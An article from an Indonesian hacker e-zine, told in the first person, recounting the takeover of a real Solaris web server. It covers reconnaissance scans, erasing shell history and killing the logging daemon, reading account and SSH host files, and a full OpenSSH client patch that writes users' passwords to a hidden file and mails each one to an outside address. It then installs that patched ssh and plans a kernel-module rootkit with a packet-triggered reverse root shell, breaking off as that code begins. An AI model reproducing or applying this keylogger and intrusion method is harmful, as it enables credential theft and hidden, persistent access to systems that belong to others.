@@ -1,0 +1,1105 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : The Art of Being Invisible
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+                
+
+
+--[1]-- Kecoak Elektronik License
+
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+
+--[2]-- Introduction
+
+
+Mengambil judul yang sedang ngetrend saat ini, menggunakan kata-kata 
+"The Art of blablabla". Ada the "The Art of Deception" dan "The Art
+of Intrussion" by Kevin Mitnick, "The Art of Exploitation" dan masih
+banyak lagi (Buku yang sesuai dengan judulnya cool). Akhir - akhir ini 
+kata 'art' ini banyak di adopsi dan di terjemahkan dalam bahasa 
+indonesia. Sebuah pertanyaan pantaskah tulisan penggunaan trojan dan 
+tools yang sekarang sedang maraknya beredar di indonesia di sebut 
+dengan ART..??
+
+Ada juga seseorang berpendapat "root doesn't need connectback, sure??
+let see ordinary port knocking won't help :-) ". Dari begitu banyak 
+alasan ini lah akhirnya muncul tulisan yang di beri judul "The Art of 
+Being Invisible". Yeah, walaupun bukan eleet teknik tapi ini akan menjadi 
+teknik yang menarik dalam backdooring. Berdasarkan real case backdoor
+ing mesin SunOS 5.9/sparc mengkombinasikan pengetahuan tentang Loadable
+Kernel Module Solaris, OpenSSH outgoing keylog, Connect-back with 
+libpcap programming, dan pengetahuan basic networking.
+
+
+
+--[3]-- Analisa Compromised Machine
+
+
+Yang saya maksud dengan analisis mesin yang sudah di kompromise adalah
+menganalisis topologi jaringan, proses di dalam mesin, perilaku 
+sysadmin terhadap mesinnya, firewall, NAT (Silakan disimak sendiri di
+bagian artikel berikut). Analisis topologi jaringan mestinya dilakukan 
+sebelum proses exploitasi tetapi berhubung saya tidak tertarik menjelas
+kan proses exploitasi(may be next time), maka saya sertakan juga 
+analisis topologi jaringan dan posisi fisik server yang hendak di 
+backdoor (Doing some shit f0r some fun for a night long). 
+
+Analisis dilakukan external dari laur mesin di internet dan juga internal
+di dalam mesin. Analisis external dari luar mesin secara teknikal bisa di
+gambarkan sebagai berikut :
+
+
+mybox~>ssh -l root 2xx.xxx.xxx.xxx
+root@2xx.xxx.xx.xxx's password:
+Last login: Mon Sep 17 07:28:43 2007
+FreeBSD 4.10-RELEASE (XXX) #2: Xxx xxx xx xx:xx:xx WIT xxxx
+root@owned->unset HISTFILE;unset HISTSIZE;unset HISTFILESIZE
+root@owned->unset USERNAME
+root@owned->host www.xxxxx.lv
+www.xxxxx.lv has address 212.xxx.xxx.xxx
+root@owned->nmap -sV -P0 -F -O -T5 212.xx.xxx.xxx
+
+Starting Nmap 4.20 ( http://insecure.org ) at 2007-09-29 20:52 WIT
+Interesting ports on 212.xxx.xxx.xxx:
+Not shown: 1252 filtered ports
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      Solaris ftpd
+80/tcp  open   http     Apache httpd 1.3.27 ((Unix) PHP/4.3.1)
+113/tcp closed auth
+Device type: general purpose
+Running (JUST GUESSING) : Sun Solaris 9|10 (96%)
+Aggressive OS guesses: Sun Solaris 9 (SPARC) (96%), Sun Solaris 9 or 10 (96%), 
+Sun Solaris 10 (SPARC) (93%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime: 19.938 days (since Sun Sep  9 22:26:04 2007)
+Service Info: Host: xxxxx.xxxxx.lv; OS: Solaris
+
+OS and Service detection performed. Please report any incorrect results at 
+http://insecure.org/nmap/submit/ .
+Nmap finished: 1 IP address (1 host up) scanned in 254.755 seconds
+root@owned->nmap -sA -P0 -F -T5 212.xxx.xxx.xxx
+
+Starting Nmap 4.20 ( http://insecure.org ) at 2007-09-29 20:57 WIT
+Interesting ports on 212.xxx.xxx.xxx:
+Not shown: 1252 filtered ports
+PORT    STATE      SERVICE
+20/tcp  UNfiltered ftp-data
+21/tcp  UNfiltered ftp
+80/tcp  UNfiltered http
+113/tcp UNfiltered auth
+
+Nmap finished: 1 IP address (1 host up) scanned in 206.369 seconds
+root@owned->
+
+
+Setelah selesai melakukan analisis external dari luar mesin yang hendak
+dipasang backdoor, saya kembali ke mesin SunOS yang baru saja ditakeover
+untuk melakukan pemasangan backdoor
+
+
+212.xxx.xxx.xxx: inverse host lookup failed: Unknown host
+connect to [72.xxx.xxx.xxx] from (UNKNOWN) [212.xxx.xxx.xxx] 51980
+SunOS xxxx.xxxxx.lv 5.9 Generic_112233-04 sun4u sparc SUNW,Sun-Blade-100
+uid=60001(nobody) gid=60001(nobody)
+unset HISTFILE
+
+(DOING SOME SHIT - FINALLY BECOME ROOT w00t w00t)
+
+id
+uid=0(root) gid=60001(nobody)
+unset HISTFILE
+/bin/bash -i
+bash: no job control in this shell
+bash-2.05# unset HISTFILE
+unset HISTFILE
+bash-2.05# unset HISTSIZE;unset HISTFILESIZE;unset USERNAME
+unset HISTSIZE;unset HISTFILESIZE;unset USERNAME
+bash-2.05# PS1="root@Sun0wn3d>"
+PS1="root@Sun0wn3d>"
+root@Sun0wn3d>finger root
+finger root
+Login name: root                        In real life: Super-User
+Directory: /                            Shell: /usr/bin/bash
+Last login Sun Sep  9 22:01 on pts/1 from 212.xxx.xxx.xxx
+Mail last read Wed Feb  7 11:41:41 2007
+No Plan.
+
+root@Sun0wn3d>echo $PATH
+echo $PATH
+/usr/sbin:/usr/bin
+
+root@Sun0wn3d>PATH="$PATH:/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sfw/bin:/usr/ccs/bin"
+root@Sun0wn3d>export PATH
+root@Sun0wn3d>echo $PATH
+echo $PATH
+/usr/sbin:/usr/bin:/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sfw/bin:/usr/ccs/bin
+
+root@Sun0wn3d>cat /etc/passwd|grep sh
+cat /etc/passwd|grep sh
+root:x:0:1:Super-User:/:/usr/bin/bash
+kaspis:x:100:1::/export/home/kaspis:/usr/bin/bash
+ansis:x:101:1::/export/home/ansis:/usr/bin/bash
+mysql:x:102:1::/home/mysql:/bin/sh
+clamav:x:103:1::/home/clamav:/bin/sh
+
+root@Sun0wn3d>cat /.ssh/known_hosts|awk '{print $1}'
+cat /.ssh/known_hosts|awk '{print $1}'
+192.168.1.1
+localhost
+10.11.0.2
+192.168.1.3
+10.11.51.188
+212.xxx.xxx.xxx
+
+root@Sun0wn3d>cat /export/home/kaspis/.ssh/known_hosts|awk '{print $1}'
+cat /export/home/kaspis/.ssh/known_hosts|awk '{print $1}'
+192.168.1.1
+10.11.0.2
+localhost
+
+root@Sun0wn3d>cat /export/home/ansis/.ssh/known_hosts|awk '{print $1}'
+cat /export/home/ansis/.ssh/known_hosts|awk '{print $1}'
+192.168.1.1
+
+root@Sun0wn3d>last -20
+last -20
+root      pts/1        212.xxx.xxx.xxx     Sun Sep  9 22:01 - 22:05  (00:04)
+root      pts/1        212.xxx.xxx.xxx     Sun Sep  9 17:56 - 18:12  (00:16)
+reboot    system boot                   Sun Sep  9 17:52
+root      pts/1        212.xxx.xxx.xxx     Sun Sep  9 17:50 - 17:51  (00:01)
+root      pts/1        212.xxx.xxx.xxx     Sun Sep  9 10:13 - 10:29  (00:15)
+root      pts/1        212.xxx.xxx.xxx     Fri Apr 27 10:48 - 11:12  (00:23)
+reboot    system boot                   Wed Apr 18 12:12
+root      pts/1        212.xxx.xxx.xxx     Wed Apr 18 12:10 - 12:10  (00:00)
+root      pts/1        212.xxx.xxx.xxx     Sat Apr 14 13:14 - 13:22  (00:08)
+reboot    system boot                   Thu Mar 29 09:43
+root      pts/1        10.1.1.42        Thu Mar 29 09:41 - 09:41  (00:00)
+reboot    system boot                   Tue Mar 20 09:36
+root      pts/1        212.xxx.xxx.xxx     Tue Mar 20 09:34 - 09:35  (00:00)
+root      pts/1        212.xxx.xxx.xxx     Mon Mar 19 07:30 - 07:44  (00:14)
+reboot    system boot                   Wed Mar  7 16:00
+root      pts/1        212.xxx.xxx.xxx     Wed Mar  7 15:58 - 15:59  (00:00)
+root      pts/1        212.xxx.xxx.xxx     Mon Feb 26 14:59 - 15:36  (00:37)
+root      pts/1        212.xxx.xxx.xxx     Wed Feb  7 11:31 - 12:32  (01:00)
+root      pts/1        212.xxx.xxx.xxx     Mon Jan 29 13:58 - 14:03  (00:05)
+reboot    system boot                   Mon Jan 29 13:56
+
+root@Sun0wn3d>cat /etc/syslog.conf
+cat /etc/syslog.conf
+#ident  "@(#)syslog.conf        1.5     98/12/14 SMI"   /* SunOS 5.0 */
+#
+# Copyright (c) 1991-1998 by Sun Microsystems, Inc.
+# All rights reserved.
+#
+# syslog configuration file.
+#
+# This file is processed by m4 so be careful to quote (`') names
+# that match m4 reserved words.  Also, within ifdef's, arguments
+# containing commas must be quoted.
+#
+*.err;kern.notice;auth.notice                   /dev/sysmsg
+*.err;kern.debug;daemon.notice;mail.crit        /var/adm/messages
+
+*.alert;kern.err;daemon.err                     operator
+*.alert                                         root
+
+*.emerg                                         *
+
+# if a non-loghost machine chooses to have authentication messages
+# sent to the loghost machine, un-comment out the following line:
+#auth.notice                    ifdef(`LOGHOST', /var/log/authlog, @loghost)
+
+mail.debug                      ifdef(`LOGHOST', /var/log/syslog, @loghost)
+
+local6.=info  /opt/sfw/squid/logs/SquidClamAV_Redirector.log
+
+#
+# non-loghost machines will use the following lines to cause "user"
+# log messages to be logged locally.
+#
+ifdef(`LOGHOST', ,
+user.err                                        /dev/sysmsg
+user.err                                        /var/adm/messages
+user.alert                                      `root, operator'
+user.emerg                                      *
+)
+
+root@Sun0wn3d>cd /
+cd /
+root@Sun0wn3d>ls -al
+ls -al
+total 32283
+-rw-r--r--   1 root     other         73 feb 12  2003 !!!
+drwxr-xr-x  23 root     root        1024 aug  8 14:47 .
+drwxr-xr-x  23 root     root        1024 aug  8 14:47 ..
+-rw-r--r--   1 root     nobody       609 sep  9 22:05 .bash_history
+-rw-r--r--   1 root     other        248 mar  5  2003 .profile
+drwx------   2 root     other        512 mar  4  2003 .ssh
+-rw-r--r--   1 root     other       6041 feb 13  2003 @
+drwxr-xr-x   2 root     other        512 feb 12  2003 aaa
+lrwxrwxrwx   1 root     root           9 feb 12  2003 bin -> ./usr/bin
+-rw-r--r--   1 root     other    15645267 mar  6  2003 binutils-2.11.2-sol8-sparc-local.gz
+-rw-r--r--   1 root     other     384531 feb  7  2003 btool.zip
+-rw-------   1 root     other         71 feb  7  2007 dead.letter
+drwxr-xr-x  18 root     sys         3072 j?n 25 18:39 dev
+drwxr-xr-x   4 root     sys          512 feb 12  2003 devices
+drwxr-xr-x  31 root     sys         3072 sep  9 17:53 etc
+drwxr-xr-x   3 root     other        512 feb 12  2003 export
+dr-xr-xr-x   1 root     root           1 sep  9 17:53 home
+drwxr-xr-x   9 root     sys          512 feb 12  2003 kernel
+lrwxrwxrwx   1 root     root           9 feb 12  2003 lib -> ./usr/lib
+drwx------   2 root     root        8192 feb 12  2003 lost+found
+-rw-------   1 root     other      21983 okt  1  2003 mbox
+drwxr-xr-x   2 root     sys          512 feb 12  2003 mnt
+dr-xr-xr-x   1 root     root           1 sep  9 17:53 net
+drwxr-xr-x   3 root     sys          512 j?n 20  2005 opt
+drwxr-xr-x  23 root     sys         1024 feb 12  2003 platform
+dr-xr-xr-x  48 root     root       62400 sep 29 18:34 proc
+drwxr-xr-x   2 root     sys         1024 okt 18  2006 sbin
+drwxr-xr-x   5 root     other        512 feb  7  2003 SUNWbtool
+drwxr-xr-x   5 root     other        512 feb  7  2003 SUNWbtoox
+drwxrwxrwt   3 root     sys          527 sep 29 03:30 tmp
+drwxr-xr-x  24 root     sys          512 feb 15  2003 usr
+drwxr-xr-x  26 root     sys          512 mar  5  2003 var
+dr-xr-xr-x   1 root     root           1 sep  9 17:53 xfn
+-rw-------   1 root     root      335024 aug  8 14:47 core
+
+root@Sun0wn3d>wc -l .bash_history
+wc -l .bash_history
+      64 .bash_history
+root@Sun0wn3d>cat .bash_history|grep ps
+cat .bash_history|grep ps
+root@Sun0wn3d>cat .bash_history|grep modinfo
+cat .bash_history|grep modinfo
+
+root@Sun0wn3d>cat .bash_history
+cat .bash_history
+id
+w
+history
+cat /.bash_history
+exit
+cd /usr/local/apache.htdocs
+cd /usr/local/apache/htdocs
+ls
+ls -l
+ls -l a2r
+ls
+ls -l envo
+cd /var/log
+ls
+cat syslog
+cat authlog
+cd /usr/local/apache
+ls
+cd logs
+ls
+ls -l
+ls
+ls -l
+gzip access.log
+gzip
+pwd
+gzip -h
+gzip access_log
+ls -l
+ls -l
+ls -l
+ls -l
+ls -l
+ls -l
+ls -l
+ls -l
+touch access_log
+ls -l
+ls -l
+exit
+cd /usr/local/apache
+ls
+cd htdocs
+ls
+cd dam
+ls
+cd ../..
+ls
+cd logs
+ls -l
+cat access_log
+cat error_log
+df -h
+exit
+cd /usr/local/apache/logs
+ls -l
+cat error_log
+cat error_log
+cat access_log
+whois
+whois 78.84.139.52
+whois -h 78.84.139.52
+whois www.arita.lv
+exit
+
+root@Sun0wn3d>tail -50 /export/home/kaspis/.bash_history
+cd include/
+ls
+cd php/
+ls
+cd ..
+ls
+cd ..
+ls
+cd
+cd php-4.3.1
+ls
+ls -l
+find / -name php.ini-dist
+cd /usr/local
+ls
+cd lib
+ls- l
+ls -l
+pwd
+ls
+cdc /usr/local
+ls
+cd /usr/local
+ls
+cd php
+pwd
+cd apache/
+cd htdocs/
+ls
+cd portal
+ls
+cd
+cd php-4.3.1
+./configure --help | grep zlib
+w
+cd /usr/local
+ls
+cd apa
+pwd
+cd apache/
+cd conf
+ls
+ls -l
+date
+ps -ef
+ps -ef | grep nagios
+exit
+df -k
+ps -ef
+exit
+
+root@Sun0wn3d>netstat -an -P tcp|grep LIST
+netstat -an -P tcp|grep LIST
+      *.111                *.*                0      0 49152      0 LISTEN
+      *.21                 *.*                0      0 49152      0 LISTEN
+      *.32771              *.*                0      0 49152      0 LISTEN
+      *.32772              *.*                0      0 49152      0 LISTEN
+      *.32773              *.*                0      0 49152      0 LISTEN
+      *.4045               *.*                0      0 49152      0 LISTEN
+      *.80                 *.*                0      0 49152      0 LISTEN
+      *.22                 *.*                0      0 49152      0 LISTEN
+      *.22                 *.*                0      0 49152      0 LISTEN
+      *.3306               *.*                0      0 49152      0 LISTEN
+      *.3128               *.*                0      0 49152      0 LISTEN
+      *.21                 *.*                0      0 49152      0 LISTEN
+      *.22                 *.*                0      0 49152      0 LISTEN
+root@Sun0wn3d>ifconfig -a|grep inet_addr
+ifconfig -a|grep inet_addr
+root@Sun0wn3d>ifconfig -a
+ifconfig -a
+lo0: flags=1000849<UP,LOOPBACK,RUNNING,MULTICAST,IPv4> mtu 8232 index 1
+        inet 127.0.0.1 netmask ff000000
+eri0: flags=1000843<UP,BROADCAST,RUNNING,MULTICAST,IPv4> mtu 1500 index 2
+        inet 192.168.1.2 netmask ffffff00 broadcast 192.168.1.255
+        ether 0:3:ba:24:79:f4
+root@Sun0wn3d>ps -aeAf
+ps -aeAf
+     UID   PID  PPID  C    STIME TTY      TIME CMD
+    root     0     0  0   sep 09 ?        0:18 sched
+    root     1     0  0   sep 09 ?        0:00 /etc/init -
+    root     2     0  0   sep 09 ?        0:00 pageout
+    root     3     0  0   sep 09 ?       59:14 fsflush
+    root   250     1  0   sep 09 console  0:00 /usr/lib/saf/ttymon -g -h -p (CUT)
+    root   248     1  0   sep 09 ?        0:00 /usr/lib/saf/sac -t 300
+    root   144     1  0   sep 09 ?        0:00 /usr/lib/autofs/automountd
+    root    49     1  0   sep 09 ?        0:00 /usr/lib/sysevent/syseventd
+    root    57     1  0   sep 09 ?        0:15 /usr/lib/picl/picld
+    root    98     1  0   sep 09 ?        0:00 /usr/sbin/rpcbind
+    root   232     1  0   sep 09 ?        0:11 /usr/local/sbin/sshd
+    root   140     1  0   sep 09 ?        0:00 /usr/lib/nfs/lockd
+    root   122     1  0   sep 09 ?        0:00 /usr/sbin/inetd -s
+    root   155     1  0   sep 09 ?        0:03 /usr/sbin/syslogd
+    root   177     1  0   sep 09 ?        0:14 /usr/sbin/nscd
+  nobody   407   187  0   sep 09 ?        2:14 /usr/local/apache/bin/httpd start
+  daemon   141     1  0   sep 09 ?        0:00 /usr/lib/nfs/statd
+    root   170     1  0   sep 09 ?        0:00 /usr/sbin/cron
+    root   172     1  0   sep 09 ?        0:00 /usr/lib/utmpd
+    root   183     1  0   sep 09 ?        0:00 /usr/sbin/mdmonitord
+    root   186   122  0   sep 09 ?        0:00 rpc.metad
+    root   187     1  0   sep 09 ?        0:01 /usr/local/apache/bin/httpd start
+  nobody   190   187  0   sep 09 ?        2:35 /usr/local/apache/bin/httpd start
+  nobody   191   187  0   sep 09 ?        2:35 /usr/local/apache/bin/httpd start
+  nobody   192   187  0   sep 09 ?        2:42 /usr/local/apache/bin/httpd start
+  nobody   193   187  0   sep 09 ?        2:32 /usr/local/apache/bin/httpd start
+  nobody   194   187  0   sep 09 ?        2:27 /usr/local/apache/bin/httpd start
+    root   198     1  0   sep 09 ?        0:00 /bin/sh ./bin/mysqld_safe (CUT)
+  nobody   227   225  1   sep 09 ?       196:01 (squid)
+   mysql   224   198  0   sep 09 ?        8:10 /usr/local/mysql-standard-4.0.15 (CUT)
+    root   212     1  0   sep 09 ?        2:20 /usr/local/sbin/prngd /var/spool/prngd/pool
+    root   225     1  0   sep 09 ?        0:00 /opt/sfw/squid/bin/squid
+  nobody   256   187  0   sep 09 ?        2:26 /usr/local/apache/bin/httpd start
+    root   254   248  0   sep 09 ?        0:00 /usr/lib/saf/ttymon
+  nobody   234   227  0   sep 09 ?        2:23 (unlinkd)
+  nobody   306   187  0   sep 09 ?        2:28 /usr/local/apache/bin/httpd start
+  nobody   406   187  0   sep 09 ?        2:07 /usr/local/apache/bin/httpd start
+  nobody   273   187  0   sep 09 ?        2:37 /usr/local/apache/bin/httpd start
+
+(EDITED : biar ga kebanyakan)
+
+root@Sun0wn3d>#MATIKAN SYSLOGD
+#MATIKAN SYSLOGD
+root@Sun0wn3d>kill -9 155
+kill -9 155
+root@Sun0wn3d>ssh
+usage: ssh [-1246AaCfgkMNnqsTtVvXxY] [-b bind_address] [-c cipher_spec]
+           [-D [bind_address:]port] [-e escape_char] [-F configfile]
+           [-i identity_file] [-L [bind_address:]port:host:hostport]
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+           [-R [bind_address:]port:host:hostport] [-S ctl_path]
+           [-w local_tun[:remote_tun]] [user@]hostname [command]
+
+root@Sun0wn3d>cat /var/adm/sulog|grep ansis|head -2
+SU 02/14 17:05 + pts/1 ansis-root
+SU 02/21 11:26 + pts/1 ansis-root
+root@Sun0wn3d>cat /var/adm/sulog|grep kaspis|tail -2
+SU 04/14 10:17 - pts/2 kaspis-root
+SU 04/14 10:18 + pts/2 kaspis-root
+
+
+
+Setelah melakukan analisis baik internal maupun external saya menyimpulkan 
+beberapa hal yang menurut saya cukup menarik diantaranya sebagai berikut :
+
+(*) Dari hasil nmap di simpulkan bahwa firewall hanya membuka 4 port TCP
+    dari luar ( -sA scanning). Sayangnya port SSH di blok padahal saya 
+    biasa menggunakan backdoor SSH. Sedangkan service yang dibuka dari 
+    luar ada dua FTP (21) dan HTTP (80) ( -sV scanning ). Pemasangan backdoor 
+    di port 20 tidak dimungkinkan karena port FTP-DATA, sedangkan di port
+    113 juga cukup mencurigakan.
+(*) Dari pengamatan IP address di interface yang ternyata tidak mempunyai
+    IP publik seperti saat di scanning nmap, saya simpulkan server yang
+    baru saja saya takeover di dalam NAT. Dari hasil netstat yang diperoleh
+    ternyata banyak sekali service yang di aktifkan termasuk SSH hanya saja
+    di blok dari firewall. Setelah di analisis lagi disimpulkan topologi
+    networknya kira-kira
+
+       (INTERNET)--------(GATEWAY+FIREWALL)--------(OWNED)
+ 
+(*) Dengan kondisi bahwa port 20,21,80,113 saja yang di buka, saya tidak
+    menginginkan memasang backdoor di port - port itu. Jika saya memutus
+    kan memasang backdoor di port selain 4 port TCP di atas maka server
+    gateway harus di takeover. Pemasangan port knocking di OWNED server
+    tidak akan membantu banyak karena incomming connection di filter
+    dari gateway.
+(*) Sysadmin sering mengecek proses di mesinnya dan juga rajin membackup
+    logs apache, artinya penambahan proses tanpa di hilangkan dari list
+    akan mencurigakan, pemasangan web shell juga berpeluang besar diketahui
+    keberadaannya. Beruntung bahwa frekuensi user dan root login jarang
+    (Setelah login bulan april baru login lagi bulan september).
+(*) Dari pembacaan ~/.bash_history disimpulkan bahwa adminnya jarang mela
+    kukan pengecekan Loadable Kernel Modul menggunakan modinfo bahkan 
+    mungkin tidak pernah, artinya menambahkan modul di kernel peluang
+    diketahuinya sedikit.
+(*) Dari hasil pembacaan ~/.ssh/known_hosts ada beberapa mesin yang 
+    mungkin di gaining melalui ssh, namun saat saya lihat help ssh nya
+    disimpulkan itu ssh client dari OpenSSH versi baru. Jika anda terbiasa
+    menggunakan ssh patch dari sec.angrypacket.com maka ssh nya menjadi
+    sangat mencurigakan karena help ssh nya sangat berbeda (OpenSSH 3.4p1)
+(*) Dari pembacaan file logs di /var/adm/sulog diperkirakan baik user ansis
+    maupun user kaspis mengetahui root passwordnya.
+(*) Silakan di simpulkan sendiri kira-kira bagaimana perlakuan sysadmin
+    terhadap servernya dari analisis teknikal yang saya pastekan. Itung
+    -itung belajar ya... 
+
+
+
+--[4]-- Let Start Fooling With The Backdoor
+
+
+Setelah melakukan analisis sederhana saya menginginkan agar semua koneksi
+ssh outgoing di log dalam file dan dikirim ke email saya. Walaupun saya
+sebenernya punya patch untuk ssh Openssh-4.5p1 saya tidak menggunakannya.
+Server SunOS menggunakan OpenSSH-4.3p1 artinya sudah bukan default dari 
+Sun lagi, Saya bisa saja membuat patch agar ssh OpenSSH-4.3p1 menjadi
+keylogger namun saya memilih memodifikasi OpenSSH-4.7p1 yang merupakan
+versi terbaru dari OpenSSH-4.7p1 selain itu tidak ada perbedaan dengan
+OpenSSH-4.3p1 kalau di tinjau dari interface user sehingga tidak mencuriga
+kan. Saya sengaja tidak mengubah file sshd OpenSSH menjadi trojan karena
+koneksi incomming SSH di blok dari luar, sedangkan untuk mendapatkan password
+asli user-user yang ada di sistem, saya memilih menggunakan John The Ripper
+daripada melalui modifikasi sshd setidaknya hal ini meminimalkan perubahan
+proses yang tidak terlalu berguna dalam backdooring.
+
+Setalah sekitar 30 menit melakukan modifikasi sshconnect2.c dari OpenSSH
+4.7p1 yang digunakan sebagai keylogger outgoing koneksi ssh, saya melaku
+kan sedikit testing untuk memastikan bahwa keylogger berjalan sebagaimana
+mestinya. Hmm 1 jam berlalu untuk memastikan bahwa keylogger ssh berjalan
+baik, fyuhhhh akhirnya saya mulai memasang ssh client keyloggernya. 
+Download OpenSSH 4.7p1 dan sshkeylog4.7p1.diff dari
+
+http://openbsd.md5.com.ar/pub/OpenBSD/OpenSSH/portable/openssh-4.7p1.tar.gz
+http://kecoak-elektronik.net/download/sshkeylog4.7p1.diff
+
+Extract file .tar.gz menggunakan gunzip dan tar -xvf, karena tidak ada 
+option z di SunOS.
+
+root@Sun0wn3d>cat sshkeylog4.7p1.diff
+cat sshkeylog4.7p1.diff
+--- sshconnect2.old.c   2007-09-28 20:16:26.000000000 +0700
++++ sshconnect2.c       2007-09-28 20:50:07.000000000 +0700
+@@ -69,6 +69,11 @@
+ #include "ssh-gss.h"
+ #endif
+ 
++//SSH client keylogger based on OpenSSH 4.7p1
++//Patch is supplied by k-elektronik
++//better find another path to log sniffed password
++#define LOGZ "/var/tmp/.vi.recover/pw.txt"
++
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
+@@ -735,8 +740,9 @@
+ userauth_passwd(Authctxt *authctxt)
+ {
+        static int attempt = 0;
+-       char prompt[150];
++       char prompt[150],logz[128];
+        char *password;
++       FILE *f;
+ 
+        if (attempt++ >= options.number_of_password_prompts)
+                return 0;
+@@ -746,7 +752,18 @@
+ 
+        snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+            authctxt->server_user, authctxt->host);
++       
+        password = read_passphrase(prompt, 0);
++       //logs di file
++       if((f=fopen(LOGZ,"a"))!=NULL){
++               fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,password,authctxt->host);
++               fclose(f);
++       }
++       //kirim ke server pake curl/mail terserah
++       //example pake 'mailx'
++       snprintf(logz,sizeof(logz),"tail -1 %s|mailx -s \"[owned user]new fucked user\" hacker@eleet.com",LOGZ);
++        system(logz);  
++       
+        packet_start(SSH2_MSG_USERAUTH_REQUEST);
+        packet_put_cstring(authctxt->server_user);
+        packet_put_cstring(authctxt->service);
+
+
+root@Sun0wn3d>cp sshkeylog4.7p1.diff openssh-4.7p1/
+cp sshkeylog4.7p1.diff openssh-4.7p1/
+root@Sun0wn3d>cd openssh-4.7p1/
+cd openssh-4.7p1/
+root@Sun0wn3d>patch < sshkeylog4.7p1.diff
+patch < sshkeylog4.7p1.diff
+patching file sshconnect2.c
+root@Sun0wn3d>./configure 
+(wait till finish - edited)
+root@Sun0wn3d>make ssh
+(wait till finish - edited)
+root@Sun0wn3d>which ssh
+which ssh
+/usr/local/bin/ssh
+root@Sun0wn3d>cp /usr/local/bin/ssh ../ssh.old
+cp /usr/local/bin/ssh ../ssh.old
+root@Sun0wn3d>cp -rf ssh /usr/local/bin/ssh
+cp ssh /usr/local/bin/ssh
+root@Sun0wn3d>
+
+
+Setelah selesai memasang keylogger outgoing ssh, lalu saya berpikir 
+bagaimana saya harus membackdoor root yang sudah di takeover, awalnya 
+saya mengambil resiko dengan memasang backdoor web shell di kombinasi 
+dengan suid root file namun saya pikir sangat tidak elegan karena dari 
+pertimbangan adminnya sering membackup access_logs dan juga jika saya 
+lupa mengunset HISTFILE maka celakalah ketika saya mengeksekusi 
+file suid root itu masuk ke .bash_history. Akhirnya saya berpikir 
+menggunakan Trojan Loadable Kernel Module dikombinasi dengan Connect
+back root shell. Beberapa teknik connect-back yang ada di kepala saya 
+saat pemasangan backdoor :
+
+- ICMP reverse root shell, sayang ICMP nya di drop dari gateway
+- Reverse root shell dengan knocking sequence menggunakan TCP flags 
+  SYN ke port 21,80,113, namun tools yang pernah saya buat tidak 
+  bekerja di SunOS padahal bekerja dengan baik di BSD dan linux.
+- Proses reverse root shell menggunakan data hasil sniff libpcap. 
+  Dan akhirnya teknik ini yang dipakai.
+
+Loadable Kernel Modul yang dipakai merupakan versi modifikasi dari
+'slkm' buatan THC yang saya gunakan untuk hidden file dan untuk
+hidden proccess. Jika anda benar-benar tertarik dengan pemrograman 
+kernel module silakan cari tutorialnya di http://freeworld.thc.org. 
+Walaupun di tutorial THC di impelementasi di kernel lama, namun 
+dengan sedikit modifikasi dan logika mestinya bisa di recode untuk 
+keperluan LKM di kernel baru saat ini. Lebih detail tentang kegunaan 
+LKM modules ini sebagai berikut :
+
+- Hidden file - file illegal di dalam server termasuk file untuk
+  keperluan reverse shell root dengan libpcap support.
+- Hidden process daemon yang digunakan untuk reverse shell root
+  dari proses list.
+
+Sayangnya saya tidak tertarik untuk disclose trojan Loadable Kernel
+Module ini, namun anda tidak perlu kecewa karena PoC untuk reverse root 
+shell dengan sniff data menggunakan libpcap tetap saya sertakan. Walaupun 
+sejujurnya saya tidak ingin mendisclose codenya ( Say hello to whitehat
+and security industry ). Bagi anda yang masih pemula dan butuh tentang
+artikel loadable kernel module silakan dibuka link di bawah ini :
+
+OpenBSD : http://kecoak-elektronik.net/web/fezine/09-openbsd-lkm.txt
+SunOS   : http://kecoak-elektronik.net/download/uidroot.txt
+
+Setelah memahami sedikit konsep fool and fun with kernel hacking, 
+saatnya di lanjutkan ke PoC reverse root shellnya. Waktu sudah menunjuk
+kan pukul 01:20 AM saya memulai membuka lagi tutorial pcap programming
+di http://www.tcpdump.org
+
+Note : It seems to be new connect-back/reverse shell for you right??
+Yeah connect-back/reverse shell with data sniffing technique.
+Usually connect back is used for web reverse shell or connect-back 
+shellcode ( metasploit users : connect-back payload )
+
+Dari www.tcpdump.org saya mendapatkan code sniffex.c, kemudian memodifi
+kasi codenya yang tadinya digunakan untuk sniffing di sulap menjadi
+backdooring tools. Sebagai informasi saja karena LKM SunOS nya tidak
+saya publish, maka saya sertakan proccess faker dalam backdoor tersebut.
+Setelah sekitar 1,5 jam saya mengcode backdoor dan melakukan testing,
+saya mencoba memasang backdoornya di mesin SunOS 5.9 yang sudah saya 
+takeover. The game is started again.....
+
+root@Sun0wn3d>cat snfrbd.c
+/*
+REMOTE REVERSE ROOT SHELL BACKDOOR
+By Someone [at] K-elektronik
+
+LICENSE and COPYRIGHT : 
